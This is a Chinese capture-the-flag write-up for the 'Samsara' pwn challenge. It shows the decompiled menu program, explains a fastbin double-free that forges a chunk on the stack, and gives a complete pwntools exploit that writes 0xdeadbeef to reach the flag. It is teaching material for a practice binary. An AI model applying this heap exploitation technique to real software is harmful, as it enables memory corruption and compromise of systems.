

## Samsara

- 题目描述：

  > 在击败Demon Dragon后，你终于也变成了Demon Dragon…… 
  >
  > By *Mercurio* 	

 - [题目附件](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Samsara/samsara)

 - 考察点：double free

 - 难度：中等

 - 初始分值：300

 - 最终分值：299

 - 完成人数：2

### 程序分析

菜单题，输入1创建大小为8的chunk，输入2将其释放，输入3可修改任意chunk数据，输入4打印变量`v9`地址，输入5可修改`v9`的值，输入6时判断变量`v10`，当`v10==0xDEADBEEF`时给flag

```c
void __fastcall main(__int64 a1, char **a2, char **a3){
  __int64 *v3; // rsi
  const char *v4; // rdi
  int v5; // ebx
  int v6; // [rsp+Ch] [rbp-44h]
  int v7; // [rsp+10h] [rbp-40h]
  __gid_t rgid; // [rsp+14h] [rbp-3Ch]
  __int64 v9; // [rsp+18h] [rbp-38h]
  __int64 v10; // [rsp+20h] [rbp-30h]
  __int64 v11; // [rsp+28h] [rbp-28h]
  __int64 v12; // [rsp+30h] [rbp-20h]
  unsigned __int64 v13; // [rsp+38h] [rbp-18h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  rgid = getegid();
  v3 = (__int64 *)rgid;
  setresgid(rgid, rgid, rgid);
  v10 = 0LL;
  v4 = "After defeating the Demon Dragon, you turned yourself into the Demon Dragon...";
  puts("After defeating the Demon Dragon, you turned yourself into the Demon Dragon...");
  while ( 2 ) {
    v12 = 0LL;
    sub_A50(v4, v3);
    v3 = (__int64 *)&v6;
    _isoc99_scanf("%d", &v6);
    switch ( (unsigned int)off_F70 ){
      case 1u:                                  // capture
        if ( i >= 7 ){
          v4 = "You can't capture more people.";
          puts("You can't capture more people.");
        }
        else{
          v5 = i;
          people[v5] = malloc(8uLL);
          ++i;
          v4 = "Captured.";
          puts("Captured.");
        }
        continue;
      case 2u:                                  // eat
        puts("Index:");
        v3 = (__int64 *)&v7;
        _isoc99_scanf("%d", &v7);
        free(people[v7]);
        v4 = "Eaten.";
        puts("Eaten.");
        continue;
      case 3u:                                  // cook
        puts("Index:");
        _isoc99_scanf("%d", &v7);
        puts("Ingredient:");
        v3 = &v12;
        _isoc99_scanf("%llu", &v12);
        *(_QWORD *)people[v7] = v12;
        v4 = "Cooked.";
        puts("Cooked.");
        continue;
      case 4u:                                  // show
        v3 = &v9;
        v4 = "Your lair is at: %p\n";
        printf("Your lair is at: %p\n", &v9);
        continue;
      case 5u:                                  // move
        puts("Which kingdom?");
        v3 = &v11;
        _isoc99_scanf("%llu", &v11);
        v9 = v11;
        v4 = "Moved.";
        puts("Moved.");
        continue;
      case 6u:                                  // flag
        if ( v10 == 0xDEADBEEFLL )
          system("cat flag");
        puts("Now, there's no Demon Dragon anymore...");
        break;
      default:
        goto LABEL_13;
    }
    break;
  }
LABEL_13:
  exit(1);
}
```

### 解题思路

在栈上伪造chunk，然后利用`double free`分配一个位于`v9-8`的chunk，输入3修改这个chunk，被修改的地址为`v9-8+16 = v10`，向其中写`0xdeadbeef`即可getflag

输入4修改`v9`的值为`0x21`即可伪造chunk，不伪造chunk的话，`malloc`会报错

```
chunk+0:  v9-8:xxx      v9: 0x21
chunk+8:  v10: 0x0      xxxxxxxx
```

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './samsara'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def capture():
    sla('choice > ','1')

def eat(index):
    sla('choice > ','2')
    sla('Index:\n',str(index))

def cook(index, data):
    sla('choice > ','3')
    sla('Index:\n',str(index))
    sla('Ingredient:\n',str(data))

def show():
    sla('choice > ','4')
    ru('Your lair is at: ')
    return eval(rc(14))

def move(data):
    sla('choice > ','5')
    sla('Which kingdom?\n',str(data))

def commit():
    sla('choice > ','6')

ptr = show()
info_addr('ptr',ptr)
move(0x21)

capture() # 0
capture() # 1
capture() # 2

eat(0)
eat(1)
eat(0)

# debug()
capture()   # 3
cook(0,ptr-0x8) 
capture()   # 4
capture()   # 5 
capture()   # 6 
cook(6,0xdeadbeef)

commit()

p.interactive()
```



### 官方wp

官方wp讲解的很详细啊，摘录过来：D

> 逆向可以知道每次抓人都执行`malloc(8)`，我们不能控制分配的大小。那么在释放的时候，chunk必定进入fastbin。操作3就是编辑chunk的内容，不存在溢出。但是这题有两个奇怪的操作：输入4会打印出栈上变量`lair`的位置，输入5会改变`lair`的值。最后，退出程序时，检查栈上变量`target`是否等于`0xdeadbeef`，如果等于就能getflag，但是整个程序中不存在对`target`的任何读写操作。
>
> 漏洞点在于`free`之后没有置指针为NULL，考虑`double free`。首先分配三个chunk，按`chunk0->chunk1->chunk0`的顺序释放，第二次释放`chunk0`时它不在对应fastbin的头部，因此不会被检测到。再申请两次分别得到`chunk3`和`chunk4`，按first-fit原则前者即`chunk0`，后者即`chunk1`，但此时`chunk0`依然会留在fastbin中。
>
> 接下来，我们在`target`附近伪造chunk。我们逆向发现`lair`在`target`上方8B处，因此先输入4，设置`lair=0x20`以伪造`chunk_size`。然后输入5得到`&lair`，那么`&lair-8`处就是伪造的chunk的chunk指针。伪造好以后，我们向`chunk3`即`chunk0`的`fd`写入`&lair-8`。此时，fastbin内就变成了`chunk0->fake_chunk`，申请一次得到`chunk0`，第二次得到`fake_chunk`。
>
> 此时向`fake_chunk`写数据，等价于向`(&lair-8) + 0x10`也就是`target`写数据，写入`0xdeadbeef`并退出程序即可。
>
> ref: [Samsara](https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Samsara)

